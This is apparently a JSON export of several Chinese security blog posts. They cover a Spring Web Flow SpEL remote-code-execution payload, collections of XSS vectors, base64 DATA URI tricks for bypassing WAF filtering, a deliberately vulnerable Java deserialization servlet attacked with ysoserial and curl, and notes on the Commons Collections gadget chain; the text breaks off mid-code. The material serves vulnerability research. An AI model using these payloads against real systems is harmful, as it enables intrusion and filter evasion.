class=\"line\">vulnerable: True</span><br><span class=\"line\">Location: /hotels/search</span><br><span class=\"line\">Content-Length: 0</span><br><span class=\"line\">Date: Tue, 18 Jul 2017 06:23:18 GMT</span><br><span class=\"line\">Connection: close</span><br></pre></td></tr></table></figure>\n<p>弹个计算器试试, payload:<br><code>_(new+java.lang.ProcessBuilder(&quot;/usr/bin/open&quot;, &quot;/Applications/Calculator.app&quot;)).start()=iswin</code><br><img src=\"/2017/07/18/【漏洞分析】Spring-Web-Flow框架远程代码执行-CVE-2017-4971/002.png\"></p>\n<h2 id=\"漏洞流程\"><a href=\"#漏洞流程\" class=\"headerlink\" title=\"漏洞流程\"></a>漏洞流程</h2><p>view对象处理用户事件，会根据HTTP参数绑定相应的model。<br><img src=\"/2017/07/18/【漏洞分析】Spring-Web-Flow框架远程代码执行-CVE-2017-4971/005.png\"></p>\n<p>如果model没有设置<code>BinderConfiguration</code>, 则会调用<code>addDefaultMappings</code>函数。<br><img src=\"/2017/07/18/【漏洞分析】Spring-Web-Flow框架远程代码执行-CVE-2017-4971/006.png\"></p>\n<p>进一步查看<code>addDefaultMappings</code>函数，可以发现输入参数以<code>fieldMarkerPrefix</code>(“_”)开头，则会调用<code>addEmptyValueMapping</code>函数。<br><img src=\"/2017/07/18/【漏洞分析】Spring-Web-Flow框架远程代码执行-CVE-2017-4971/007.png\"></p>\n<p>若<code>useSpringBeanBinding</code>参数设置为<code>false</code>,则 <code>expressionParser</code>将设置为<code>SpelExpressionParser</code>对象的实例，而不是<code>BeanWrapperExpressionParser</code>对象的实例。当调用<code>getValueType</code>函数时，<code>SpelExpressionParser</code>对象将执行表达式，触发任意代码执行。<br><img src=\"/2017/07/18/【漏洞分析】Spring-Web-Flow框架远程代码执行-CVE-2017-4971/008.png\"></p>\n<h2 id=\"补丁分析\"><a href=\"#补丁分析\" class=\"headerlink\" title=\"补丁分析\"></a>补丁分析</h2><p>从补丁可以看出，直接将<code>ExpressionParser</code>设置为<code>BeanWrapperExpressionParser</code>对象的实例， 默认是执行不了表达式的。<br><img src=\"/2017/07/18/【漏洞分析】Spring-Web-Flow框架远程代码执行-CVE-2017-4971/009.png\"></p>\n<h2 id=\"Ref\"><a href=\"#Ref\" class=\"headerlink\" title=\"Ref\"></a>Ref</h2><ul>\n<li><a href=\"https://blog.gdssecurity.com/labs/2017/7/17/cve-2017-4971-remote-code-execution-vulnerability-in-the-spr.html\" target=\"_blank\" rel=\"noopener\">CVE-2017-4971: Remote Code Execution Vulnerability In The Spring Web Flow Framework</a></li>\n<li><a href=\"http://bobao.360.cn/learning/detail/3963.html\" target=\"_blank\" rel=\"noopener\">CVE-2017-4971：Spring WebFlow 远程代码执行漏洞分析</a></li>\n<li><a href=\"https://www.ibm.com/developerworks/cn/education/java/j-spring-webflow/index.html\" target=\"_blank\" rel=\"noopener\">Spring Web Flow 2.0 入门</a></li>\n<li><a href=\"http://spring.cndocs.tk/expressions.html\" target=\"_blank\" rel=\"noopener\">Spring 表达式语言 (SpEL)</a></li>\n</ul>\n","categories":["Web安全"],"tags":["JAVA","RCE"]},{"title":"collect xss vector","url":"http://www.beesfun.com/2017/06/08/collect-xss-vector/","content":"<h2 id=\"tag\"><a href=\"#tag\" class=\"headerlink\" title=\"tag\"></a>tag</h2><h3 id=\"marquee\"><a href=\"#marquee\" class=\"headerlink\" title=\"marquee\"></a>marquee</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;marquee onstart=alert(1)&gt;xss&lt;/marquee&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"svg\"><a href=\"#svg\" class=\"headerlink\" title=\"svg\"></a>svg</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># &lt;svg&gt;&lt;script&gt;\\u&#123;61&#125;lert`1`&lt;script&gt;&lt;/svg&gt;</span><br><span class=\"line\">&lt;svg&gt;&lt;script&gt;&amp;#x0005C;u&amp;lcub;61&amp;#125;le&lt;/&gt;rt&amp;grave;1&amp;grave;&lt;/script&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"body\"><a href=\"#body\" class=\"headerlink\" title=\"body\"></a>body</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;body onload=```$&#123;prompt``&#125;`&gt;</span><br></pre></td></tr></table></figure>\n","categories":["Web安全"],"tags":["XSS"]},{"title":"DATA URI Bypass WAF","url":"http://www.beesfun.com/2017/06/07/DATA-URI-Bypass-WAF/","content":"<h2 id=\"DATA-URI\"><a href=\"#DATA-URI\" class=\"headerlink\" title=\"DATA URI\"></a>DATA URI</h2><p>“Used to embed small items of data into a URL—rather than link to an external resource, the URL contains the actual encoded data. URIs are supported by most modern browsers except for some versions of Internet Explorer.”</p>\n<p>Data URI 是一种提供让外置资源的直接内嵌在页面中的方案。这种技术允许我们只需单次 HTTP 请求即可获取所有需要引用的图片与样式资源。</p>\n<p>在 RFC2397（<a href=\"http://tools.ietf.org/html/rfc2397）中定义了它格式规范：\" target=\"_blank\" rel=\"noopener\">http://tools.ietf.org/html/rfc2397）中定义了它格式规范：</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"Bypass-WAF\"><a href=\"#Bypass-WAF\" class=\"headerlink\" title=\"Bypass WAF\"></a>Bypass WAF</h2><p>一般来说，WAF识别XSS向量，主要通过以下规则</p>\n<ul>\n<li>html标签，如: <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;svg&gt;</code>等</li>\n<li>event handlers, 如: <code>onload</code>, <code>onerror</code></li>\n<li>data Attribute</li>\n<li>js keyword, 如: <code>alert()</code>, <code>confirm()</code></li>\n</ul>\n<p>使用DATA URI利用base64编码数据绕过WAF对xss payload的检测。那么如何使用DATA URI执行javascript呢？</p>\n<h3 id=\"object-tag\"><a href=\"#object-tag\" class=\"headerlink\" title=\"object tag\"></a>object tag</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># base64 decode: &lt;script&gt;alert(1);&lt;/script&gt;</span><br><span class=\"line\">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>通常WAF都会拦截<code>&lt;object&gt;</code>标签</p>\n<h3 id=\"svg-tags\"><a href=\"#svg-tags\" class=\"headerlink\" title=\"svg tags\"></a>svg tags</h3><p>参考 <a href=\"http://insert-script.blogspot.com.au/2014/02/svg-fun-time-firefox-svg-vector.html\" target=\"_blank\" rel=\"noopener\">http://insert-script.blogspot.com.au/2014/02/svg-fun-time-firefox-svg-vector.html</a>, 使用<code>svg + use</code>执行javascript.</p>\n<ul>\n<li>test.html for firefox</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;</span><br><span class=\"line\">&lt;use xlink:href=&quot;data:image/svg+xml;base64,</span><br><span class=\"line\">PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDo</span><br><span class=\"line\">vL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW</span><br><span class=\"line\">5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rI</span><br><span class=\"line\">iAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+DQo8</span><br><span class=\"line\">YSB4bGluazpocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KGx</span><br><span class=\"line\">vY2F0aW9uKSI+PHJlY3QgeD0iMCIgeT0iMCIgd2lkdG</span><br><span class=\"line\">g9IjEwMCIgaGVpZ2h0PSIxMDAiIC8+PC9hPg0KPC9zd</span><br><span class=\"line\">mc+#rectangle&quot; /&gt;</span><br><span class=\"line\">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>base64 payload 解码为:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg id=&quot;rectangle&quot;</span><br><span class=\"line\">xmlns=&quot;http://www.w3.org/2000/svg&quot;</span><br><span class=\"line\">xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;</span><br><span class=\"line\">width=&quot;100&quot; height=&quot;100&quot;&gt;</span><br><span class=\"line\">&lt;a xlink:href=&quot;javascript:alert(location)&quot;&gt;</span><br><span class=\"line\">&lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;100&quot; height=&quot;100&quot; /&gt;</span><br><span class=\"line\">&lt;/a&gt;</span><br><span class=\"line\">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>当点击黑色方框时会触发XSS.要达到自动触发XSS的目的，可以使用如下paylaod:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg id=&quot;rectangle&quot;</span><br><span class=\"line\">xmlns=&quot;http://www.w3.org/2000/svg&quot;</span><br><span class=\"line\">xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;</span><br><span class=\"line\">width=&quot;100&quot; height=&quot;100&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;foreignObject width=&quot;100&quot; height=&quot;50&quot;</span><br><span class=\"line\">requiredExtensions=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;embed xmlns=&quot;http://www.w3.org/1999/xhtml&quot;</span><br><span class=\"line\">src=&quot;javascript:alert(location)&quot; /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/foreignObject&gt;</span><br><span class=\"line\">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>better test.html for firefox</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;svg&gt;</span><br><span class=\"line\">&lt;use xlink:href=&quot;data:image/svg+xml;base64,</span><br><span class=\"line\">PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cD</span><br><span class=\"line\">ovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhs</span><br><span class=\"line\">aW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW</span><br><span class=\"line\">5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+</span><br><span class=\"line\">PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3</span><br><span class=\"line\">JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0i</span><br><span class=\"line\">NTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZW</span><br><span class=\"line\">RFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8x</span><br><span class=\"line\">OTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dH</span><br><span class=\"line\">A6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0i</span><br><span class=\"line\">amF2YXNjcmlwdDphbGVydChsb2NhdGlvbikiIC8+DQ</span><br><span class=\"line\">ogICAgPC9mb3JlaWduT2JqZWN0Pg0KPC9zdmc+#rectangle&quot; /&gt;</span><br><span class=\"line\">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"img-tags\"><a href=\"#img-tags\" class=\"headerlink\" title=\"img tags\"></a>img tags</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=&quot; onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n","categories":["Web安全"],"tags":["XSS","DATA URI"]},{"title":"ysoserial反序列化研究","url":"http://www.beesfun.com/2017/05/20/ysoserial反序列化研究/","content":"<h2 id=\"demo环境搭建\"><a href=\"#demo环境搭建\" class=\"headerlink\" title=\"demo环境搭建\"></a>demo环境搭建</h2><p>源码分析ysoserial, 了解java反序列化利用的常见方式，光说不练假把式，搭建demo环境，测试ysoserial利用的实际效果。</p>\n<p><strong>开发环境</strong></p>\n<ul>\n<li>InteliJ IDEA</li>\n<li>JDK 1.8.0_112-b16</li>\n<li>tomcat 8.5</li>\n<li>MAC OS</li>\n</ul>\n<p>新建项目”SimpleWebDemo”,再新建servlet文件”SimpleServlet”,项目配置如下图:</p>\n<img src=\"/2017/05/20/ysoserial反序列化研究/001.png\">\n<a id=\"more\"></a>\n<p><code>SimpleServlet</code>源码如下:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> demo;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.ServletInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by js on 2017/5/19.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SimpleServlet</span> <span class=\"keyword\">extends</span> <span class=\"title\">javax</span>.<span class=\"title\">servlet</span>.<span class=\"title\">http</span>.<span class=\"title\">HttpServlet</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">doPost</span><span class=\"params\">(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response)</span> <span class=\"keyword\">throws</span> javax.servlet.ServletException, IOException </span>&#123;</span><br><span class=\"line\">        ServletInputStream sis = request.getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">        ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(sis);</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            ois.readObject();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (ClassNotFoundException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        ois.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">doGet</span><span class=\"params\">(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response)</span> <span class=\"keyword\">throws</span> javax.servlet.ServletException, IOException </span>&#123;</span><br><span class=\"line\">        PrintWriter out = response.getWriter();</span><br><span class=\"line\">        out.println(<span class=\"string\">\"This is a demo\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>利用ysoserial生成payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -jar ysoserial-v0.0.4.jar CommonsCollections5 &quot;open -a Calculator&quot; &gt; calc.payload</span><br></pre></td></tr></table></figure>\n<p>curl访问触发漏洞:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl &quot;http://127.0.0.1:8080/demo&quot; --data-binary &quot;@./calc.payload&quot;</span><br></pre></td></tr></table></figure>\n<img src=\"/2017/05/20/ysoserial反序列化研究/002.png\">\n<h2 id=\"ysoserial反序列化利用\"><a href=\"#ysoserial反序列化利用\" class=\"headerlink\" title=\"ysoserial反序列化利用\"></a>ysoserial反序列化利用</h2><p>查看反序列化用到的组件及所需满足的条件: <code>java -jar ysoserial-v0.0.4.jar</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Y SO SERIAL?</span><br><span class=\"line\">Usage: java -jar ysoserial-[version]-all.jar [payload type] &apos;[command to execute]&apos;</span><br><span class=\"line\">\tAvailable payload types:</span><br><span class=\"line\">\t\tBeanShell1 [org.beanshell:bsh:2.0b5]</span><br><span class=\"line\">\t\tC3P0 [com.mchange:c3p0:0.9.5.2, com.mchange:mchange-commons-java:0.2.11]</span><br><span class=\"line\">\t\tCommonsBeanutils1 [commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-logging:commons-logging:1.2]</span><br><span class=\"line\">\t\tCommonsCollections1 [commons-collections:commons-collections:3.1]</span><br><span class=\"line\">\t\tCommonsCollections2 [org.apache.commons:commons-collections4:4.0]</span><br><span class=\"line\">\t\tCommonsCollections3 [commons-collections:commons-collections:3.1]</span><br><span class=\"line\">\t\tCommonsCollections4 [org.apache.commons:commons-collections4:4.0]</span><br><span class=\"line\">\t\tCommonsCollections5 [commons-collections:commons-collections:3.1]</span><br><span class=\"line\">\t\tCommonsCollections6 [commons-collections:commons-collections:3.1]</span><br><span class=\"line\">\t\tFileUpload1 [commons-fileupload:commons-fileupload:1.3.1, commons-io:commons-io:2.4]</span><br><span class=\"line\">\t\tGroovy1 [org.codehaus.groovy:groovy:2.3.9]</span><br><span class=\"line\">\t\tHibernate1 []</span><br><span class=\"line\">\t\tHibernate2 []</span><br><span class=\"line\">\t\tJBossInterceptors1 [javassist:javassist:3.12.1.GA, org.jboss.interceptor:jboss-interceptor-core:2.0.0.Final, javax.enterprise:cdi-api:1.0-SP1, javax.interceptor:javax.interceptor-api:3.1, org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final, org.slf4j:slf4j-api:1.7.21]</span><br><span class=\"line\">\t\tJRMPClient []</span><br><span class=\"line\">\t\tJRMPListener []</span><br><span class=\"line\">        JSON1 [net.sf.json-lib:json-lib:jar:jdk15:2.4, org.springframework:spring-aop:4.1.4.RELEASE, aopalliance:aopalliance:1.0, commons-logging:commons-logging:1.2, commons-lang:commons-lang:2.6, net.sf.ezmorph:ezmorph:1.0.6, commons-beanutils:commons-beanutils:1.9.2, org.springframework:spring-core:4.1.4.RELEASE, commons-collections:commons-collections:3.1]</span><br><span class=\"line\">\t\tJavassistWeld1 [javassist:javassist:3.12.1.GA, org.jboss.weld:weld-core:1.1.33.Final, javax.enterprise:cdi-api:1.0-SP1, javax.interceptor:javax.interceptor-api:3.1, org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final, org.slf4j:slf4j-api:1.7.21]</span><br><span class=\"line\">\t\tJdk7u21 []</span><br><span class=\"line\">\t\tJython1 [org.python:jython-standalone:2.5.2]</span><br><span class=\"line\">\t\tMozillaRhino1 [rhino:js:1.7R2]</span><br><span class=\"line\">\t\tMyfaces1 []</span><br><span class=\"line\">\t\tMyfaces2 []</span><br><span class=\"line\">\t\tROME [rome:rome:1.0]</span><br><span class=\"line\">\t\tSpring1 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-beans:4.1.4.RELEASE]</span><br><span class=\"line\">\t\tSpring2 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-aop:4.1.4.RELEASE, aopalliance:aopalliance:1.0, commons-logging:commons-logging:1.2]</span><br><span class=\"line\">\t\tURLDNS []</span><br><span class=\"line\">\t\tWicket1 [wicket-util:wicket-util:6.23]</span><br></pre></td></tr></table></figure>\n<p>可以看出ysoyerial支持多种组件，而最常见的就是<code>commons-collections</code>组件了。因此有必要分析ysoserial利用<code>commons-collections</code>组件构造反序列化POP链的原理。</p>\n<h2 id=\"commons-collections\"><a href=\"#commons-collections\" class=\"headerlink\" title=\"commons-collections\"></a>commons-collections</h2><h3 id=\"commons-collections1\"><a href=\"#commons-collections1\" class=\"headerlink\" title=\"commons-collections1\"></a>commons-collections1</h3><p><strong>依赖条件</strong></p>\n<ul>\n<li>commons-collections:3.1</li>\n</ul>\n<p><strong>调用链</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Gadget chain:</span><br><span class=\"line\">    ObjectInputStream.readObject()</span><br><span class=\"line\">        AnnotationInvocationHandler.readObject()</span><br><span class=\"line\">            Map(Proxy).entrySet()</span><br><span class=\"line\">                AnnotationInvocationHandler.invoke()</span><br><span class=\"line\">                    LazyMap.get()    &lt;== 触发调用 transform()</span><br><span class=\"line\">                        ChainedTransformer.transform()</span><br><span class=\"line\">                            ConstantTransformer.transform()</span><br><span class=\"line\">                            InvokerTransformer.transform()</span><br><span class=\"line\">                                Method.invoke()\t\t\t\t</span><br><span class=\"line\">                                    Class.getMethod()</span><br><span class=\"line\">                            InvokerTransformer.transform()</span><br><span class=\"line\">                                Method.invoke()</span><br><span class=\"line\">                                    Runtime.getRuntime()</span><br><span class=\"line\">                            InvokerTransformer.transform()</span><br><span class=\"line\">                                Method.invoke()</span><br><span class=\"line\">                                    Runtime.exec()</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://gursevkalra.blogspot.cz/2016/01/ysoserial-commonscollections1-exploit.html\" target=\"_blank\" rel=\"noopener\">http://gursevkalra.blogspot.cz/2016/01/ysoserial-commonscollections1-exploit.html</a><br><a href=\"https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html\" target=\"_blank\" rel=\"noopener\">https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html</a></p>\n<p><a href=\"http://blog.knownsec.com/2016/03/java-deserialization-commonsbeanutils-pop-chains-analysis/\" target=\"_blank\" rel=\"noopener\">http://blog.knownsec.com/2016/03/java-deserialization-commonsbeanutils-pop-chains-analysis/</a></p>\n","categories":["Web安全"],"tags":["反序列化","JAVA"]},{"title":"JAVA反序列化漏洞知识点整理","url":"http://www.beesfun.com/2017/05/07/JAVA反序列化漏洞知识点整理/","content":"<p>jenkins反序列漏洞跟过一遍之后，虽说梳理清楚了漏洞触发的大体流程，但是对于JAVA反序列化漏洞导致代码执行的原理仍旧不懂，因此有必要整理JAVA反序列化漏洞相关的知识点。</p>\n<a id=\"more\"></a>\n<h2 id=\"JAVA反序列化漏洞\"><a href=\"#JAVA反序列化漏洞\" class=\"headerlink\" title=\"JAVA反序列化漏洞\"></a>JAVA反序列化漏洞</h2><p>反序列化漏洞的本质是反序列化机制打破了数据和对象的边界，导致攻击者注入的恶意序列化数据在反序列化过程中被还原成对象，控制了对象就可能在目标系统上面执行攻击代码，而不可信的输入和未检测反序列化对象的安全性是导致反序列化漏洞的常见原因。Java序列化常应用于RMI(Java Remote Method Invocatio, 远程方法调用)， JMX(Java Management Extensions, Java管理扩展), JMS(Java Message Service, Java消息服务) 技术中。</p>\n<h2 id=\"利用Apache-Commons-Collections实现远程代码执行\"><a href=\"#利用Apache-Commons-Collections实现远程代码执行\" class=\"headerlink\" title=\"利用Apache Commons Collections实现远程代码执行\"></a>利用Apache Commons Collections实现远程代码执行</h2><p>Apache Commons Collections作为一种公用库，其中实现的一些类可以被反序列化用来实现任意代码执行。这里以以Apache Commons Collections 3.2.1为例，解释如何构造对象，能够让程序在反序列化，即调用readObject()时，就能直接实现任意代码执行。</p>\n<h3 id=\"利用反射机制执行任意代码\"><a href=\"#利用反射机制执行任意代码\" class=\"headerlink\" title=\"利用反射机制执行任意代码\"></a>利用反射机制执行任意代码</h3><p>国外研究人员发现<code>InvokerTransformer</code>类中的<code>transform()</code>方法允许通过反射, 执行参数对象的某个方法，并返回执行结果。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InvokerTransformer</span> <span class=\"keyword\">implements</span> <span class=\"title\">Transformer</span>, <span class=\"title\">Serializable</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> serialVersionUID = -<span class=\"number\">8653385846894047688L</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> String iMethodName;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Class[] iParamTypes;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Object[] iArgs;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">InvokerTransformer</span><span class=\"params\">(String methodName)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.iMethodName = methodName;</span><br><span class=\"line\">        <span 